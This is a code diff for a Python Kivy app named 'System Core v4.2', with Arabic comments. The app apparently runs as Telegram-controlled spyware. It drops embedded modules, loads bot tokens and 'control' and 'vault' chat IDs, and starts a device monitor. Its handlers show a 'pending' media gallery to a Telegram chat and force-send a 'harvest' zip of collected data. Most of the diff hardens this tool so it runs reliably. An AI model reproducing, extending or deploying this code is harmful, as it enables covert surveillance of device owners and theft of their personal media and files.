+            logging.error(f"Send now handler error: {e}")
+
+    def _handle_media(self, tg, m, cid):
+        try:
+            if hasattr(m, 'gallery_browser') and m.gallery_browser:
+                kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
+                res = tg._api("sendMessage", {"chat_id": cid, "text": "🖼️ معرض الوسائط", "reply_markup": json.dumps(kb)})
+                if res and res.get('ok'): m.last_mid = res['result']['message_id']
+            else:
+                tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
+        except Exception as e:
+            logging.error(f"Media handler error: {e}")
 
 def force_send_zip(m, device_id, tg, chat_id):
-    if hasattr(m, 'daily_zipper') and m.daily_zipper:
-        threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,)).start()
-    else: tg._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير جاهزة"})
+    try:
+        if hasattr(m, 'daily_zipper') and m.daily_zipper:
+            threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,), daemon=True).start()
+        else:
+            tg._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير جاهزة"})
+    except Exception as e:
+        logging.error(f"force_send_zip error: {e}")
 
 _handler = None
+_handler_lock = threading.Lock()
 def ex(cmd, tg, m, cid, cbq=None):
     global _handler
-    if _handler is None: _handler = C()
+    with _handler_lock:
+        if _handler is None:
+            _handler = C()
     _handler.ex(cmd, tg, m, cid, cbq)
 '''
 }
 
 def _extract_embedded_files():
-    """كتابة الملفات المضمّنة إلى المجلد R إن لم تكن موجودة."""
+    """كتابة الملفات المضمّنة إلى المجلد R مع التحقق من صحتها."""
     for filename, content in EMBEDDED_FILES.items():
         dest = os.path.join(R, filename)
+        should_extract = False
         if not os.path.exists(dest):
+            should_extract = True
+        else:
+            try:
+                # التحقق من صحة الملف (حجمه لا يقل عن 100 بايت)
+                if os.path.getsize(dest) < 100:
+                    should_extract = True
+                else:
+                    # التحقق من صحة الكود باستخدام compile
+                    with open(dest, 'r', encoding='utf-8') as f:
+                        code = f.read()
+                    try:
+                        compile(code, dest, 'exec')
+                        print(f"✅ {filename} is valid")
+                    except SyntaxError:
+                        print(f"⚠️ {filename} has syntax errors, re-extracting...")
+                        should_extract = True
+            except Exception:
+                should_extract = True
+        
+        if should_extract:
             try:
                 with open(dest, 'w', encoding='utf-8') as f:
                     f.write(content.strip())
-                print(f"Extracted embedded: {filename}")
+                # التحقق من صحة الملف بعد الكتابة
+                with open(dest, 'r', encoding='utf-8') as f:
+                    compile(f.read(), dest, 'exec')
+                print(f"✅ Extracted embedded: {filename}")
             except Exception as e:
-                print(f"Failed to extract {filename}: {e}")
+                print(f"❌ Failed to extract {filename}: {e}")
 
 class CoreApp(App):
-    # ... (باقي الكلاس كما في النسخة السابقة دون تغيير يذكر، فقط أضفنا استدعاء _extract_embedded_files في البداية)
-
     def build(self):
-        # نستدعي استخراج الملفات المضمّنة مبكراً
+        # استخراج الملفات المضمّنة
         _extract_embedded_files()
+        
         self.title = "System Core v4.2"
         layout = BoxLayout(orientation='vertical', spacing=5)
+        
         self.log = TextInput(
             text="", readonly=True,
             background_color=(0.02, 0.02, 0.02, 1),
             foreground_color=(0.3, 0.9, 0.3, 1), font_size='10sp'
         )
+        
         btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
         copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
         copy_btn.bind(on_press=self._copy)
         clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
         clear_btn.bind(on_press=self._clear)
-        btns.add_widget(copy_btn); btns.add_widget(clear_btn)
-        layout.add_widget(self.log); layout.add_widget(btns)
+        btns.add_widget(copy_btn)
+        btns.add_widget(clear_btn)
+        
+        layout.add_widget(self.log)
+        layout.add_widget(btns)
+        
         Clock.schedule_once(self._start, 0.5)
         return layout
 
-    # ... (باقي التوابع كما هي) ...
+    def _copy(self, instance):
+        try:
+            Clipboard.copy(self.log.text)
+            print("✅ Log copied to clipboard")
+        except Exception as e:
+            print(f"Copy error: {e}")
+
+    def _clear(self, instance):
+        self.log.text = ""
+        print("✅ Log cleared")
+
+    def _start(self, dt):
+        def _log(msg):
+            Clock.schedule_once(lambda x: setattr(self.log, 'text', self.log.text + msg + "\n"))
+        
+        _log("[INIT] Starting system...")
+        self._init_core()
+
+    def _init_core(self):
+        def _log(msg):
+            Clock.schedule_once(lambda x: setattr(self.log, 'text', self.log.text + msg + "\n"))
+        
+        try:
+            # ===== 1. إعداد الصلاحيات =====
+            _log("[1/5] Setting permissions...")
+            _perms()
+            
+            # ===== 2. نسخ نموذج الذكاء الاصطناعي =====
+            _log("[2/5] Copying AI model...")
+            copy_model_to_models_dir()
+            
+            # ===== 3. تحميل الإعدادات =====
+            _log("[3/5] Loading configuration...")
+            active, reserve, ctrl, vault, secret = load_secrets_from_config()
+            _log(f"     Active tokens: {len(active)}, Reserve tokens: {len(reserve)}")
+            _log(f"     Control ID: {ctrl}, Vault ID: {vault}")
+            
+            # ===== 4. تهيئة المكونات الأساسية =====
+            _log("[4/5] Initializing components...")
+            
+            # استيراد المكونات
+            from monitor import M
+            mon = M()
+            from telegram_ui import T
+            ui = T(mon, active, reserve, ctrl, vault, secret)
+            
+            # ربط المكونات ببعضها
+            mon.ui = ui
+            mon.ctrl = ctrl
+            mon.vlt = vault
+            
+            # ===== 5. بدء التشغيل =====
+            _log("[5/5] Starting services...")
+            ui.start()
+            mon.start()
+            
+            _log("✅ System initialized successfully!")
+            _log(f"📱 Device: {mon.dmd} ({mon.did[:8]})")
+            
+            # حفظ المراجع للاستخدام لاحقاً
+            self.mon = mon
+            self.ui = ui
+            
+        except Exception as e:
+            _log(f"❌ ERROR: {str(e)}")
+            _log(f"❌ Traceback: {traceback.format_exc()}")
+            print(f"Critical error: {e}")
+            print(traceback.format_exc())
+
+    def on_stop(self):
+        """إيقاف نظيف عند إغلاق التطبيق"""
+        try:
+            if hasattr(self, 'mon') and self.mon:
+                self.mon.stop()
+            if hasattr(self, 'ui') and self.ui:
+                self.ui.stop()
+            print("✅ Application stopped cleanly")
+        except Exception as e:
+            print(f"Stop error: {e}")
+
 
 if __name__ == '__main__':
     CoreApp().run()
